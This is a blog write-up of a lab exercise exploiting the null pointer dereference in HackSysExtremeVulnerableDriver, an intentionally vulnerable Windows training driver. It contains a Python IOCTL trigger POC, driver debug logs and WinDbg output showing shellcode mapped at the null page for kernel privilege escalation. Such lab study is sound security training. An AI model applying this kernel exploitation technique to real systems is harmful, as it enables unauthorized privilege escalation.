---
layout:     post
title:      HackSysExtremeVulnerableDriver NullPointerDereference
author:     wooy0ung
tags:       hevd
category:   exploit
---

- 目录
{:toc #markdown-toc}

>[Analysis Environment]  
>guest machine: Windows 7 x86 sp0  
>host machine: Windows 10  
>necessary tools: VirtualKD[[here]](http://virtualkd.sysprogs.org/)、OSRloader[[here]](https://www.osronline.com/article.cfm?article=157)、HackSysExtremeVulnerableDriver[[here]](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver)、Windbg  
<!-- more -->


## 0x001 Test POC

This challenge is very similar with the last one.
```
import sys
from ctypes import *

kernel32 = windll.kernel32
psapi = windll.Psapi
ntdll = windll.ntdll

hevDevice = kernel32.CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver", 0xC0000000, 0, None, 0x3, 0, None)

if not hevDevice or hevDevice == -1:
   print "[-] Couldn't get Device Driver handle."
   sys.exit(0)

buf = "\xff\xff\xff\xff"

kernel32.DeviceIoControl(hevDevice, 0x22202B, buf, len(buf), None, 0, byref(c_ulong()), None)
```

Execute the POC, we would get this info.
```
****** HACKSYS_EVD_IOCTL_NULL_POINTER_DEREFERENCE ******
[+] Pool Tag: 'kcaH'
[+] Pool Type: NonPagedPool
[+] Pool Size: 0x8
[+] Pool Chunk: 0x877D5210
[+] UserValue: 0xFFFFFFFF
[+] NullPointerDereference: 0x877D5210
[+] Freeing NullPointerDereference Object
[+] Pool Tag: 'kcaH'
[+] Pool Chunk: 0x877D5210
[+] Triggering Null Pointer Dereference
[-] Exception Code: 0xC0000005
****** HACKSYS_EVD_IOCTL_NULL_POINTER_DEREFERENCE ******
```
It triggers an exception, while it goes on working well.


## 0x002 Exploit it!

Look at this, if a UserValue not equal to 0xBAD0B0B0, the ptr would be set up to NULL, it will call Addr 0x4.
![](/assets/img/exploit/2018-08-05-hacksys-extreme-vulnerable-driver-nullpointerdereference/0x001.png)

Like the challenge "Pool Overflow", I map the Null page and overwrite Addr 0x4 with the address shellcode

Set a breakpoint at TriggerNullPointerDereference method
```
****** HACKSYS_EVD_IOCTL_NULL_POINTER_DEREFERENCE ******
[+] Pool Tag: 'kcaH'
[+] Pool Type: NonPagedPool
[+] Pool Size: 0x8
[+] Pool Chunk: 0x87865C20
[+] UserValue: 0xFFFFFFFF
[+] NullPointerDereference: 0x87865C20
Breakpoint 1 hit
HEVD!TriggerNullPointerDereference+0xae:
8f5d1c8e 394508          cmp     dword ptr [ebp+8],eax
kd> dd 0x0
00000000  00000000 01c50000 00000000 00000000
00000010  00000000 00000000 00000000 00000000
00000020  68a2d4d0 fffffffe 00000000 00000001
00000030  68a06948 0000000d 68a0ab1c 01aab728
00000040  01aae020 00000000 00000000 00000000
00000050  00000000 00000000 00000000 00000000
00000060  00000000 00000000 00000000 00000000
00000070  00000000 00000000 00000000 00000000
kd> u 01c50000
01c50000 90              nop
01c50001 90              nop
01c50002 90              nop
01c50003 90              nop
01c50004 60              pushad
01c50005 64a124010000    mov     eax,dword ptr fs:[00000124h]
01c5000b 8b4050          mov     eax,dword ptr [eax+50h]
01c5000e 89c1            mov     ecx,eax
```

pwn~
![](/assets/img/exploit/2018-08-05-hacksys-extreme-vulnerable-driver-nullpointerdereference/0x002.png)